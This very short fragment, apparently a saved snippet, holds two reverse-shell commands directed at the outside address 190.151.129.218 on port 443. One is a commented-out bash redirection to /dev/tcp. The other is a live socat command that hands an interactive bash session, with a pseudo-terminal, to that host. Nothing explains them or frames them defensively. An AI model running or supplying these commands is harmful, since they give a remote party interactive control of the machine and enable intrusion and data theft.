#bash -i >& /dev/tcp/190.151.129.218/443 0>&1
socat tcp-connect:190.151.129.218:443 exec:'bash -li',pty,stderr,setsid,sigint,sane